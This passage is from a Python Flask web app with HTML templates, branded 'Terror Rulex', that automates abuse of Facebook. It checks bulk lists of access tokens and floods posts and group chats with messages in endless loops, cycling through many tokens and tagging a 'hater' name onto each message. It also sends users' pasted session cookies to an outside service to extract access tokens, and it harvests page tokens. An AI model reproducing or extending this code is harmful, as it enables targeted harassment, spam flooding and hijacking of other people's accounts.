
chat_tool_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CONVO TERROR</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #0a1a2f, #0d2745, #12375e, #0a1a2f);
      background-size: 400% 400%;
      animation: gradientFlow 20s ease infinite;
      color: #fff;
      padding: 20px;
    }
    @keyframes gradientFlow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .card {
      max-width: 750px;
      margin: auto;
      border-radius: 18px;
      background: rgba(15, 25, 45, 0.92);
      box-shadow: 0 10px 25px rgba(0,0,0,0.6);
      backdrop-filter: blur(15px);
      overflow: hidden;
      animation: fadeIn 0.8s ease-in-out;
    }

    /* 🔵 Cover Image */
    .cover-img {
      width: 100%;
      height: 180px;
      object-fit: cover;
    }

    /* 🔵 Divider line */
    .divider {
      height: 2px;
      background: linear-gradient(90deg, transparent, #00eaff, transparent);
      margin: 0 auto;
    }

    /* 🔵 Oscar Badge */
    .oscar-badge {
      margin: 15px auto;
      text-align: center;
      font-size: 1.3rem;
      font-weight: bold;
      color: gold;
      text-shadow: 0 0 8px rgba(255,215,0,0.8);
    }
    .oscar-badge i {
      margin-right: 8px;
      color: gold;
    }

    /* 🔵 Terror Rulex Text */
    .brand-name {
      text-align: center;
      font-size: 2rem;
      font-weight: 700;
      color: #00eaff;
      text-shadow: 0 0 12px rgba(0,234,255,0.9);
      margin-bottom: 15px;
    }

    .card-body {
      padding: 25px;
    }

    .form-label, .form-text { color: #cfe9ff !important; }
    .form-control {
      background: #0d213a;
      border: 1px solid #1e3d5f;
      color: #fff;
      border-radius: 12px;
    }
    .form-control:focus {
      background: #12375e;
      border-color: #00eaff;
      box-shadow: 0 0 10px rgba(0,234,255,0.6);
    }
    input[type="file"]::file-selector-button {
      background: #00eaff;
      border: none;
      color: #000;
      padding: 7px 12px;
      border-radius: 8px;
      cursor: pointer;
    }

    .btn-checker {
      background: #00eaff;
      border: none;
      color: #000;
      border-radius: 50px;
      padding: 12px;
      font-size: 1.1rem;
      font-weight: 600;
      width: 100%;
      transition: 0.3s;
    }
    .btn-checker:hover {
      background: #00bcd4;
      color: #fff;
      transform: scale(1.03);
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>
  <div class="card">
    <!-- Cover Image -->
    <img src="https://iili.io/KTi5xxp.jpg" class="cover-img" alt="Cover">

    <!-- Divider -->
    <div class="divider"></div>

    <!-- Oscar Badge -->
    <div class="oscar-badge">
      <i class="fas fa-trophy"></i> Diisco
    </div>

    <!-- Brand Name -->
    <div class="brand-name">
      Terror Rulex
    </div>

    <!-- Form -->
    <div class="card-body">
      <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="tool" value="chat_tool">

        <div class="mb-3">
          <label class="form-label">Convo/Inbox ID</label>
          <input type="text" class="form-control" name="convo_id" required>
          <small class="form-text">Enter Uid Off Group 92xxx</small>
        </div>

        <div class="mb-3">
          <label class="form-label">Hater Name (Recommend)</label>
          <input type="text" class="form-control" name="haters_name" required>
          <small class="form-text">Name off your Against Team</small>
        </div>

        <div class="mb-3">
          <label class="form-label">Delay (seconds)</label>
          <input type="number" class="form-control" name="delay" required min="1">
          <small class="form-text">Delay between messages in seconds </small>
        </div>

        <div class="mb-3">
          <label class="form-label">Task Stop Password</label>
          <input type="text" class="form-control" name="task_password" required>
          <small class="form-text">Password to stop this task in Your Running Treads</small>
        </div>

        <div class="mb-3">
          <label class="form-label">Upload Tokens File</label>
          <input type="file" class="form-control" name="tokens_file" required accept=".txt">
          <small class="form-text">Text file with one token per line</small>
        </div>

        <div class="mb-3">
          <label class="form-label">Upload Messages File</label>
          <input type="file" class="form-control" name="messages_file" required accept=".txt">
          <small class="form-text">Text file with one message per line</small>
        </div>

        <button type="submit" class="btn-checker">
          <i class="fas fa-paper-plane"></i> Start Now
        </button>
      </form>
    </div>
  </div>
</body>
</html>
"""

get_token_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TOKEN GET</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    /* 🔵 Gradient Background */
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0a1a2f, #12375e, #0d2745, #0a1a2f);
      background-size: 400% 400%;
      animation: gradientFlow 15s ease infinite;
      color: #fff;
      padding-bottom: 50px;
    }
    @keyframes gradientFlow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* 🔵 Card Glass Effect */
    .card {
      margin: 50px auto;
      max-width: 750px;
      border-radius: 18px;
      background: rgba(15, 25, 45, 0.9);
      backdrop-filter: blur(12px);
      box-shadow: 0 10px 25px rgba(0,0,0,0.6);
      color: #fff;
      overflow: hidden;
      animation: fadeIn 0.8s ease-in-out;
    }

    .card-header {
      background: rgba(0, 123, 255, 0.2);
      border-bottom: 1px solid rgba(255,255,255,0.2);
      text-align: center;
      padding: 20px;
    }
    .card-header h3 {
      font-weight: 600;
      color: #00eaff;
      text-shadow: 0 0 10px rgba(0,234,255,0.8);
    }

    .form-label, .form-text { color: #cfe9ff !important; }

    .form-control {
      background: #0d213a;
      border: 1px solid #1e3d5f;
      color: #fff;
      border-radius: 12px;
    }
    .form-control:focus {
      background: #12375e;
      border-color: #00eaff;
      box-shadow: 0 0 10px rgba(0,234,255,0.6);
      color: #fff;
    }

    /* 🔵 Buttons */
    .btn-purple {
      background: linear-gradient(90deg, #6f42c1, #9b59b6);
      border: none;
      color: #fff;
      border-radius: 50px;
      padding: 12px;
      font-size: 1.1rem;
      font-weight: 600;
      width: 100%;
      transition: 0.3s;
      box-shadow: 0 0 12px rgba(155, 89, 182, 0.6);
    }
    .btn-purple:hover {
      background: linear-gradient(90deg, #9b59b6, #6f42c1);
      transform: scale(1.03);
      box-shadow: 0 0 20px rgba(155, 89, 182, 0.9);
    }

    /* 🔵 Token Result Box */
    .token-box {
      margin-top: 20px;
      font-size: 14px;
      background: rgba(0,0,0,0.5);
      padding: 15px;
      border-radius: 12px;
      border: 1px solid rgba(255,255,255,0.2);
      color: #00eaff;
      box-shadow: inset 0 0 12px rgba(0,234,255,0.3);
    }
    pre {
      white-space: pre-wrap;
      word-wrap: break-word;
      font-size: 14px;
      color: #fff;
    }

    /* 🔵 Back Button */
    .back-btn {
      position: fixed;
      top: 20px;
      left: 20px;
      background: rgba(255,255,255,0.1);
      border: 1px solid rgba(255,255,255,0.2);
      color: #fff;
      padding: 8px 15px;
      border-radius: 8px;
      backdrop-filter: blur(6px);
      transition: 0.3s;
      z-index: 1000;
    }
    .back-btn:hover {
      background: #00eaff;
      color: #000;
      transform: scale(1.05);
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>
  <a href="{{ url_for('home') }}" class="back-btn">
    <i class="fas fa-arrow-left"></i> Back
  </a>

  <div class="container">
    <div class="card fade-in">
      <div class="card-header">
        <h3><i class="fas fa-key"></i> Get User Access Token</h3>
      </div>
      <div class="card-body">
        <form method="POST">
          <input type="hidden" name="tool" value="get_token">
          <div class="form-group mb-3">
            <label class="form-label">Enter Cookies</label>
            <textarea class="form-control" name="cookies" rows="3" placeholder="Paste your cookies here..." required></textarea>
            <small class="form-text">Paste your Facebook cookies to extract access token</small>
          </div>
          <button type="submit" class="btn-purple">
            <i class="fas fa-unlock"></i> Get Token
          </button>
        </form>

        {% if token_result %}
        <div class="token-box">
          <h5>Result:</h5>
          <pre>{{ token_result | tojson(indent=2) }}</pre>
        </div>
        {% endif %}
      </div>
    </div>
  </div>
</body>
</html>
"""

get_page_tokens_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Get Page Tokens - Stuner Web</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0a1a2f, #12375e, #0d2745, #0a1a2f);
      background-size: 400% 400%;
      animation: gradientFlow 15s ease infinite;
      color: #fff;
      padding-bottom: 50px;
    }
    @keyframes gradientFlow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .card {
      margin: 60px auto;
      max-width: 850px;
      border-radius: 18px;
      background: rgba(15, 25, 45, 0.9);
      backdrop-filter: blur(12px);
      box-shadow: 0 10px 25px rgba(0,0,0,0.6);
      color: #fff;
      animation: fadeIn 0.8s ease-in-out;
      overflow: hidden;
    }
    .card-header {
      background: rgba(0, 123, 255, 0.2);
      text-align: center;
      border-bottom: 1px solid rgba(255,255,255,0.2);
      padding: 20px;
    }
    .card-header h3 {
      font-weight: 600;
      color: #00eaff;
      text-shadow: 0 0 12px rgba(0,234,255,0.8);
    }

    .form-label, .form-text { color: #cfe9ff !important; }

    .form-control {
      background: #0d213a;
      border: 1px solid #1e3d5f;
      color: #fff;
      border-radius: 12px;
    }
    .form-control:focus {
      background: #12375e;
      border-color: #00eaff;
      box-shadow: 0 0 10px rgba(0,234,255,0.6);
      color: #fff;
    }

    .btn-primary {
      background: linear-gradient(90deg, #6f42c1, #9b59b6);
      border: none;
      border-radius: 50px;
      padding: 12px;
      font-size: 1.1rem;
      font-weight: 600;
      width: 100%;
      transition: 0.3s;
      box-shadow: 0 0 12px rgba(155, 89, 182, 0.6);
    }
    .btn-primary:hover {
      background: linear-gradient(90deg, #9b59b6, #6f42c1);
      transform: scale(1.03);
      box-shadow: 0 0 20px rgba(155, 89, 182, 0.9);
    }

    table {
      background: rgba(0,0,0,0.4) !important;
      color: #fff;
    }
    thead {
      background: #0d213a !important;
    }
    code {
      color: #00eaff;
    }

    .back-btn {
      position: fixed;
      top: 20px;
      left: 20px;
      background: rgba(255,255,255,0.1);
      border: 1px solid rgba(255,255,255,0.2);
      color: #fff;
      padding: 8px 15px;
      border-radius: 8px;
      backdrop-filter: blur(6px);
      transition: 0.3s;
      z-index: 1000;
    }
    .back-btn:hover {
      background: #00eaff;
      color: #000;
      transform: scale(1.05);
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>
  <a href="{{ url_for('home') }}" class="back-btn">
    <i class="fas fa-arrow-left"></i> Back
  </a>

  <div class="container">
    <div class="card fade-in">
      <div class="card-header">
        <h3><i class="fas fa-file-code"></i> Get Page Tokens</h3>
      </div>
      <div class="card-body">
        <form method="POST">
          <input type="hidden" name="tool" value="get_page_tokens">
          <div class="form-group mb-3">
            <label class="form-label">User Access Token</label>
            <input type="text" class="form-control" name="user_token" required>
            <small class="form-text">Enter a user access token with manage_pages permission</small>
          </div>
          <button type="submit" class="btn btn-primary w-100">
            <i class="fas fa-key"></i> Get Page Tokens
          </button>
        </form>

        {% if page_error %}
        <div class="alert alert-danger mt-3">{{ page_error }}</div>
        {% endif %}

        {% if page_data %}
        <div class="mt-4">
          <h5>Page Tokens:</h5>
          <div class="table-responsive">
            <table class="table table-striped">
              <thead>
                <tr>
                  <th>Page Name</th>
                  <th>Page ID</th>
                  <th>Access Token</th>
                </tr>
              </thead>
              <tbody>
                {% for page in page_data %}
                <tr>
                  <td>{{ page.name }}</td>
                  <td><code>{{ page.id }}</code></td>
                  <td><code class="text-truncate" style="max-width: 150px;">{{ page.access_token }}</code></td>
                </tr>
                {% endfor %}
              </tbody>
            </table>
          </div>
        </div>
        {% endif %}
      </div>
    </div>
  </div>
</body>
</html>
"""

tasks_html = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>terror taks</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0a1a2f, #12375e, #0d2745, #0a1a2f);
      background-size: 400% 400%;
      animation: gradientFlow 15s ease infinite;
      color: #fff;
      padding-bottom: 50px;
    }
    @keyframes gradientFlow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* Banner */
    .cover {
      width: 100%;
      height: 230px;
      background: url('https://iili.io/KTi4s99.jpg') no-repeat center center;
      background-size: cover;
      position: relative;
      border-bottom: 4px solid #00eaff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    .cover h1 {
      font-size: 3rem;
      font-weight: 700;
      color: #00eaff;
      text-shadow: 0 0 20px rgba(0,234,255,0.9), 0 0 40px rgba(0,234,255,0.7);
      margin: 0;
    }
    .cover h3 {
      font-size: 1.5rem;
      color: #ff0040;
      margin-top: 10px;
      text-shadow: 0 0 15px rgba(255,0,64,0.8), 0 0 30px rgba(255,0,64,0.6);
      letter-spacing: 2px;
    }

    .card {
      margin: -60px auto 50px auto;
      max-width: 950px;
      border-radius: 18px;
      background: rgba(15, 25, 45, 0.9);
      backdrop-filter: blur(12px);
      box-shadow: 0 10px 25px rgba(0,0,0,0.6);
      color: #fff;
      animation: fadeIn 0.8s ease-in-out;
      overflow: hidden;
      position: relative;
      z-index: 10;
    }
    .card-header {
      background: rgba(0, 123, 255, 0.15);
      border-bottom: 1px solid rgba(255,255,255,0.2);
      text-align: center;
      padding: 20px;
    }
    .card-header h3 {
      font-weight: 600;
      color: #00eaff;
      text-shadow: 0 0 12px rgba(0,234,255,0.8);
    }

    table {
      background: rgba(0,0,0,0.3) !important;
      border-radius: 10px;
      overflow: hidden;
      color: #fff;
    }
    thead {
      background: #0d213a !important;
      color: #00eaff;
    }
    tbody tr:hover {
      background: rgba(0, 234, 255, 0.08);
    }
    code {
      color: #00eaff;
    }

    .form-control {
      background: #0d213a;
      border: 1px solid #1e3d5f;
      color: #fff;
      border-radius: 8px;
      font-size: 0.85rem;
    }
    .form-control:focus {
      background: #12375e;
      border-color: #00eaff;
      box-shadow: 0 0 10px rgba(0,234,255,0.6);
    }

    .btn-danger {
      background: linear-gradient(90deg, #c0392b, #e74c3c);
      border: none;
      border-radius: 50px;
      padding: 6px 14px;
      font-size: 0.9rem;
      box-shadow: 0 0 10px rgba(231,76,60,0.7);
      transition: 0.3s;
      color: #fff;
    }
    .btn-danger:hover {
      background: linear-gradient(90deg, #e74c3c, #c0392b);
      transform: scale(1.05);
      box-shadow: 0 0 18px rgba(231,76,60,0.9);
    }

    .back-btn {
      position: fixed;
      top: 20px;
      left: 20px;
      background: rgba(255,255,255,0.1);
      border: 1px solid rgba(255,255,255,0.2);
      color: #fff;
      padding: 8px 15px;
      border-radius: 8px;
      backdrop-filter: blur(6px);
      transition: 0.3s;
      z-index: 1000;
    }
    .back-btn:hover {
      background: #00eaff;
      color: #000;
      transform: scale(1.05);
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <a href="{{ url_for('home') }}" class="back-btn">
    <i class="fas fa-arrow-left"></i> Back
  </a>

  <div class="cover">
    <h1></h1>
    <h3></h3>
  </div>

  <div class="container">
    <div class="card fade-in">
      <div class="card-header">
        <h3><i class="fas fa-tasks"></i> Terror Rulex Taks</h3>
      </div>
      <div class="card-body">
        {% if tasks or chat_tasks %}
        <div class="table-responsive">
          <table class="table table-bordered table-striped">
            <thead>
              <tr>
                <th>Task ID</th>
                <th>Type</th>
                <th>Sent</th>
                <th>Failed</th>
                <th>Status</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {% for task_id, task in tasks.items() %}
              <tr>
                <td>{{ task_id }}</td>
                <td>Comment</td>
                <td>{{ task.sent }}</td>
                <td>{{ task.failed }}</td>
                <td>{% if task.running %}Running{% else %}Stopped{% endif %}</td>
                <td>
                  <form method="POST" action="{{ url_for('stop_task', task_id=task_id) }}">
                    <div class="input-group">
                      <input type="password" name="password" placeholder="Task Password" required class="form-control form-control-sm">
                      <button type="submit" class="btn btn-danger btn-sm">
                        <i class="fas fa-stop"></i> Stop
                      </button>
                    </div>
                  </form>
                </td>
              </tr>
              {% endfor %}
              {% for task_id, task in chat_tasks.items() %}
              <tr>
                <td>{{ task_id }}</td>
                <td>Chat</td>
                <td>{{ task.sent }}</td>
                <td>{{ task.failed }}</td>
                <td>{{ task.status }}</td>
                <td>
                  <form method="POST" action="{{ url_for('stop_chat_task', task_id=task_id) }}">
                    <div class="input-group">
                      <input type="password" name="task_password" placeholder="Task Password" required class="form-control form-control-sm">
                      <button type="submit" class="btn btn-danger btn-sm">
                        <i class="fas fa-stop"></i> Stop
                      </button>
                    </div>
                  </form>
                </td>
              </tr>
              {% endfor %}
            </tbody>
          </table>
        </div>
        {% else %}
          <div class="alert alert-info text-center">No active tasks running at the moment.</div>
        {% endif %}
      </div>
    </div>
  </div>
</body>
</html>
"""

# ---------------- HELPERS ----------------
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            flash('Please login to access this page', 'danger')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function


# ---------------- ROUTES ----------------
@app.route("/login", methods=["GET", "POST"])
def login():
    if session.get('logged_in'):
        return redirect(url_for('home'))
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username in USERS and USERS[username] == password:
            session['logged_in'] = True
            session['username'] = username
            flash('Login successful!', 'success')
            return redirect(url_for('home'))
        else:
            flash('Invalid username or password', 'danger')
    return render_template_string(login_html)


@app.route("/logout")
@login_required
def logout():
    session.clear()
    flash('You have been logged out', 'info')
    return redirect(url_for('login'))


@app.route("/")
@login_required
def home():
    return render_template_string(index_html)


@app.route("/token_checker", methods=["GET", "POST"])
@login_required
def token_checker():
    token_results = []
    valid_tokens = []
    valid_count = 0
    invalid_count = 0
    if request.method == "POST" and request.form.get("tool") == "token_checker":
        tokens = []
        single_token = request.form.get("single_token", "").strip()
        if single_token:
            tokens.append(single_token)
        if "tokens_file" in request.files:
            file = request.files["tokens_file"]
            if file.filename != '':
                content = file.read().decode()
                tokens += [line.strip() for line in content.splitlines() if line.strip()]
        for token in tokens:
            try:
                url = f"https://graph.facebook.com/me?fields=id,name,email&access_token={token}"
                res = requests.get(url)
                data = res.json()
                if "name" in data:
                    name = data.get("name")
                    uid = data.get("id")
                    email = data.get("email", "No email")
                    token_results.append(TokenResult(
                        f"Name: {name} | UID: {uid} | Email: {email}",
                        True,
                        token
                    ))
                    valid_tokens.append(token)
                    valid_count += 1
                else:
                    error = data.get("error", {}).get("message", "Invalid token")
                    token_results.append(TokenResult(f"{error}", False))
                    invalid_count += 1
            except Exception as e:
                token_results.append(TokenResult(f"Error: {str(e)}", False))
                invalid_count += 1
    return render_template_string(token_checker_html,
        token_results=token_results,
        valid_count=valid_count,
        invalid_count=invalid_count,
        valid_tokens=valid_tokens
    )


@app.route("/fetch_groups", methods=["GET", "POST"])
@login_required
def fetch_groups():
    groups = []
    group_error = None
    if request.method == "POST" and request.form.get("tool") == "fetch_groups":
        token = request.form.get("token")
        try:
            url = f"https://graph.facebook.com/v19.0/me/conversations"
            params = {'fields': 'id,name', 'access_token': token}
            response = requests.get(url, params=params)
            data = response.json()
            if 'data' in data:
                for convo in data['data']:
                    if 'name' in convo:
                        groups.append({'name': convo['name'], 'id': convo['id']})
            else:
                group_error = "No groups found or invalid token permissions"
        except Exception as e:
            group_error = f"Error: {str(e)}"
    return render_template_string(fetch_groups_html,
        groups=groups,
        group_error=group_error
    )


@app.route("/post_tool", methods=["GET", "POST"])
@login_required
def post_tool():
    if request.method == "POST" and request.form.get("tool") == "post_tool":
        post_id = request.form["post_id"]
        delay = int(request.form["delay"])
        password = request.form["task_password"]
        tokens_file = request.files["tokens_file"]
        comments_file = request.files["comments_file"]
        
        tokens = tokens_file.read().decode().splitlines()
        comments = comments_file.read().decode().splitlines()
        
        task_id = f"post_{post_id}_{int(time.time())}"
        tasks[task_id] = {
            "running": True,
            "sent": 0,
            "failed": 0,
            "password": password
        }
        thread = threading.Thread(
            target=send_comments,
            args=(task_id, post_id, tokens, comments, delay, password)
        )
        thread.start()
        flash('Commenting task started successfully!', 'success')
        return redirect(url_for('tasks_page'))
    return render_template_string(post_tool_html)


def send_comments(task_id, post_id, tokens, comments, delay, password):
    sent = 0
    failed = 0
    while tasks.get(task_id, {}).get("running"):
        for i, comment in enumerate(comments):
            if not tasks.get(task_id, {}).get("running"):
                break
            token = tokens[i % len(tokens)]
            url = f"https://graph.facebook.com/{post_id}/comments"
            payload = {"message": comment, "access_token": token}
            headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 14)"}
            try:
                response = requests.post(url, data=payload, headers=headers)
                if response.ok:
                    sent += 1
                else:
                    failed += 1
            except:
                failed += 1
            tasks[task_id]["sent"] = sent
            tasks[task_id]["failed"] = failed
            time.sleep(delay)
    tasks.pop(task_id, None)


@app.route("/chat_tool", methods=["GET", "POST"])
@login_required
def chat_tool():
    if request.method == "POST" and request.form.get("tool") == "chat_tool":
        convo_id = request.form["convo_id"]
        haters_name = request.form["haters_name"]
        delay = int(request.form["delay"])
        task_password = request.form["task_password"]
        tokens_file = request.files["tokens_file"]
        messages_file = request.files["messages_file"]
        
        tokens = tokens_file.read().decode().splitlines()
        messages = messages_file.read().decode().splitlines()
        
        task_id = haters_name
        chat_tasks[task_id] = {
            'convo_id': convo_id,
            'haters_name': haters_name,
            'delay': delay,
            'tokens': tokens,
            'messages': messages,
            'running': True,
            'sent': 0,
            'failed': 0,
            'password': task_password,
            'status': 'Running'
        }
        thread = threading.Thread(
            target=send_chat_messages,
            args=(task_id, tokens, messages, convo_id, haters_name, delay)
        )
        thread.start()
        flash('Chat messaging task started!', 'success')
        return redirect(url_for('tasks_page'))
    return render_template_string(chat_tool_html)


def send_chat_messages(task_id, tokens, messages, convo_id, haters_name, delay):
    sent = 0
    failed = 0
    i = 0
    while task_id in chat_tasks and chat_tasks[task_id]['running']:
        token = tokens[i % len(tokens)].strip()
        message = messages[i % len(messages)].strip()
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}"
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14)'}
        data = {'access_token': token, 'message': haters_name + ' ' + message}
        try:
            res = requests.post(url, json=data, headers=headers)
            if res.ok:
                sent += 1
            else:
                failed += 1
        except:
            failed += 1
        chat_tasks[task_id]['sent'] = sent
        chat_tasks[task_id]['failed'] = failed
        time.sleep(delay)
        i += 1


@app.route("/get_token", methods=["GET", "POST"])
@login_required
def get_token():
    token_result = None
    if request.method == "POST" and request.form.get("tool") == "get_token":
        cookies = request.form.get("cookies", "").strip()
        if cookies:
            try:
                url = "https://kojaxd.online/api/facebook_token"
                params = {'cookies': cookies}
                response = requests.get(url, params=params)
                if response.status_code == 200:
                    token_result = response.json()
                else:
                    token_result = {
                        'error': f"API request failed with status {response.status_code}",
                        'details': response.text
                    }
            except Exception as e:
                token_result = {
                    'error': "Failed to connect to token service",
                    'details': str(e)
                }
    return render_template_string(get_token_html, token_result=token_result)


@app.route("/get_page_tokens", methods=["GET", "POST"])
@login_required
def get_page_tokens():
    page_data = []
    page_error = None
    if request.method == "POST" and request.form.get("tool") == "get_page_tokens":
        user_token = request.form.get("user_token", "").strip()
        if user_token:
            try:
                url = f"https://graph.facebook.com/v19.0/me/accounts"
                params = {'access_token': user_token, 'fields': 'id,name,access_token'}
                response = requests.get(url, params=params)
                data = response.json()
                if 'data' in data:
                    page_data = data['data']
                elif 'error' in data:
                    page_error = data['error'].get('message', 'Unknown error')
                else:
                    page_error = "No pages found or invalid permissions"
            except Exception as e:
                page_error = f"Error: {str(e)}"
    return render_template_string(get_page_tokens_html,
        page_data=page_data,
        page_error=page_error
    )


@app.route("/tasks")
@login_required
def tasks_page():
    return render_template_string(tasks_html,
        tasks=tasks,
        chat_tasks=chat_tasks
    )


@app.route("/stop/<task_id>", methods=["POST"])
@login_required
def stop_task(task_id):
    password = request.form["password"]
    task = tasks.get(task_id)
    if task and task["password"] == password:
        task["running"] = False
        flash(f"Task {task_id} stopped successfully", "success")
    else:
        flash("Incorrect password to stop task", "danger")
    return redirect(url_for('tasks_page'))


@app.route("/stop_chat/<task_id>", methods=["POST"])
@login_required
def stop_chat_task(task_id):
    password = request.form["task_password"]
    task = chat_tasks.get(task_id)
    if task and task["password"] == password:
        task["running"] = False
        task["status"] = "Stopped"
        time.sleep(1)
        chat_tasks.pop(task_id, None)
        flash(f"Chat task {task_id} stopped", "success")
    else:
        flash("Incorrect stop password", "danger")
    return redirect(url_for('tasks_page'))


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=20573, debug=True)


